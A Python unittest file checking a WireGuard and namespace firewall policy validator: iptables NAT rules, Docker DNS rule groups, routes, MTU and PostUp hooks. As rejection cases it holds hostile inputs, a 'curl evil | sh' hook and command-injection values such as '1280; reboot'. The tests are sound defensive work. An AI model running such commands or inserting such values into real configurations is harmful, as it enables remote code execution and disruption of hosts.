"""Typed namespace policy and MTU fixtures; never invokes networking tools."""
import unittest
from policy import mtu, validate_hooks, namespace_snapshot, standard_filter, docker_dns_rules, firewall_script

INTERFACE = {'Address': '10.8.1.1/24', 'MTU': '1280'}
DNS = ['-N DOCKER_OUTPUT', '-N DOCKER_POSTROUTING',
       '-A OUTPUT -d 127.0.0.11/32 -j DOCKER_OUTPUT',
       '-A POSTROUTING -d 127.0.0.11/32 -j DOCKER_POSTROUTING',
       '-A DOCKER_OUTPUT -d 127.0.0.11/32 -p tcp -m tcp --dport 53 -j DNAT --to-destination 127.0.0.11:44919',
       '-A DOCKER_OUTPUT -d 127.0.0.11/32 -p udp -m udp --dport 53 -j DNAT --to-destination 127.0.0.11:48774',
       '-A DOCKER_POSTROUTING -s 127.0.0.11/32 -p tcp -m tcp --sport 44919 -j SNAT --to-source :53',
       '-A DOCKER_POSTROUTING -s 127.0.0.11/32 -p udp -m udp --sport 48774 -j SNAT --to-source :53']


class PolicyTests(unittest.TestCase):
    def test_no_docker_dns_keeps_every_operator_rule_and_rejects_unknown_nat(self):
        ordinary = ['-P PREROUTING ACCEPT', '-A POSTROUTING -o eth0 -j MASQUERADE']
        self.assertEqual((ordinary, False), docker_dns_rules(ordinary))
        result = namespace_snapshot(self.run_fixture, 'source', INTERFACE, 'wg0')
        self.assertIn('-A POSTROUTING -s 10.8.1.0/24 -o eth0 -j MASQUERADE', result['nat'])
        def run(*args):
            data = self.run_fixture(*args)
            if 'iptables' in args and args[args.index('-t') + 1] == 'nat':
                return data + b'-A PREROUTING -p udp -j DNAT --to-destination 1.2.3.4:53\n'
            return data
        with self.assertRaisesRegex(ValueError, 'unsupported_namespace_firewall'):
            namespace_snapshot(run, 'source', INTERFACE, 'wg0')

    def test_actual_docker29_dns_group_retained_by_own_namespace_only(self):
        def fixture(ports):
            def run(*args):
                data = self.run_fixture(*args)
                if 'iptables' in args and args[args.index('-t') + 1] == 'nat':
                    group = '\n'.join(DNS).replace('44919', ports[0]).replace('48774', ports[1])
                    return data + group.encode() + b'\n'
                return data
            return run
        source = namespace_snapshot(fixture(('44919', '48774')), 'source', INTERFACE, 'wg0')
        target = namespace_snapshot(fixture(('33918', '38773')), 'target', INTERFACE, 'wg0')
        self.assertEqual(source, target)
        self.assertTrue(source['dockerDns'])
        replay = firewall_script(source)
        self.assertNotIn('DOCKER_', replay)
        self.assertNotIn('127.0.0.11', replay)
        self.assertIn('MASQUERADE', replay)

    def test_docker_dns_partial_tampered_duplicate_or_extra_rules_rejected(self):
        tampered = [DNS[:-1], DNS + [DNS[-1]],
                    [line.replace('44919', '44920') if '--sport' in line else line for line in DNS],
                    [line.replace('127.0.0.11', '127.0.0.12') for line in DNS],
                    [line.replace('--dport 53', '--dport 54') for line in DNS],
                    [line.replace('--to-source :53', '--to-source 1.2.3.4:53') for line in DNS],
                    DNS + ['-A DOCKER_OUTPUT -p tcp -j ACCEPT'],
                    [line.replace('44919', '53') for line in DNS],
                    [line.replace('-m tcp', '-m udp') for line in DNS]]
        for group in tampered:
            with self.subTest(group=group), self.assertRaisesRegex(ValueError, 'unsupported_namespace_firewall'):
                docker_dns_rules(group)

    def test_non_docker_nat_still_uses_operator_allowlist(self):
        def run(*args):
            data = self.run_fixture(*args)
            if 'iptables' in args and args[args.index('-t') + 1] == 'nat':
                return data + '\n'.join(DNS).encode() + b'\n-A PREROUTING -p udp -j DNAT --to-destination 1.2.3.4:53\n'
            return data
        with self.assertRaisesRegex(ValueError, 'unsupported_namespace_firewall'):
            namespace_snapshot(run, 'source', INTERFACE, 'wg0')

    def test_small_mtu_preserves_large_ipv4_packet_budget(self):
        # A 1252-byte ICMP payload + IPv4/ICMP headers exactly fills MTU 1280.
        payload = bytes(range(256)) * 4 + bytes(228)
        self.assertEqual(1280, len(payload) + 28)
        self.assertEqual(1280, mtu(INTERFACE['MTU']))
        for invalid in ('575', '9001', '1280; reboot', '-1'):
            with self.assertRaises(ValueError): mtu(invalid)

    def test_standard_hooks_reproduced_arbitrary_shell_rejected(self):
        validate_hooks({**INTERFACE, 'PostUp': 'iptables -A FORWARD -i %i -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE',
                        'PostDown': 'iptables -D FORWARD -i %i -j ACCEPT'}, 'wg0')
        for hook in ('curl evil | sh', 'ip rule add to 1.2.3.0/24 lookup 100',
                     'iptables -A FORWARD -i %i -j ACCEPT && reboot'):
            with self.assertRaises(ValueError): validate_hooks({**INTERFACE, 'PostUp': hook}, 'wg0')

    def run_fixture(self, *args):
        if 'link' in args: return b'5: wg0: <UP> mtu 1280 state UNKNOWN\n'
        if 'rule' in args: return b'0: from all lookup local\n32766: from all lookup main\n32767: from all lookup default\n'
        if 'iptables' in args:
            table = args[args.index('-t') + 1]
            if table == 'filter': return ('-P INPUT ACCEPT\n-P FORWARD ACCEPT\n-P OUTPUT ACCEPT\n' + '\n'.join(standard_filter('wg0', '10.8.1.0/24'))).encode()
            if table == 'nat': return b'-P PREROUTING ACCEPT\n-A POSTROUTING -s 10.8.1.0/24 -o eth0 -j MASQUERADE\n'
            return b'-P PREROUTING ACCEPT\n'
        if 'get' in args: return (args[-1] + ' dev ' + ('eth1' if args[-1].startswith('172.29.') else 'eth0')).encode()
        if 'route' in args: return b'default via 172.17.0.1 dev eth0\n10.8.1.0/24 dev wg0 proto kernel scope link src 10.8.1.1\n'
        raise AssertionError(args)

    def test_runtime_mtu_and_effective_rules_observed(self):
        result = namespace_snapshot(self.run_fixture, 'source', INTERFACE, 'wg0')
        self.assertEqual(1280, result['mtu'])
        self.assertEqual('eth1', result['egress']['172.29.172.254'])
        self.assertTrue(all('wg0' not in rule.split() for rule in result['filter']))

    def test_docker29_default_gateway_eth1_preserved_unknown_device_rejected(self):
        def routed(device):
            def run(*args):
                data = self.run_fixture(*args)
                if 'route' in args and 'get' not in args:
                    return data.replace(b'default via 172.17.0.1 dev eth0',
                        ('default via 172.29.172.1 dev ' + device).encode())
                return data
            return run
        result = namespace_snapshot(routed('eth1'), 'source', INTERFACE, 'wg0')
        self.assertIn('default via 172.29.172.1 dev eth1', result['routes'])
        self.assertNotEqual(result['routes'], namespace_snapshot(self.run_fixture, 'source', INTERFACE, 'wg0')['routes'])
        with self.assertRaisesRegex(ValueError, 'unsupported_namespace_route'):
            namespace_snapshot(routed('eth2'), 'source', INTERFACE, 'wg0')

    def test_custom_effective_policy_and_mtu_drift_fail_closed(self):
        with self.assertRaises(ValueError): namespace_snapshot(self.run_fixture, 'source', {**INTERFACE, 'MTU': '1420'}, 'wg0')
        def custom(*args):
            if 'rule' in args: return self.run_fixture(*args) + b'100: from all to 1.2.3.0/24 lookup 100\n'
            return self.run_fixture(*args)
        with self.assertRaises(ValueError): namespace_snapshot(custom, 'source', INTERFACE, 'wg0')


if __name__ == '__main__': unittest.main()
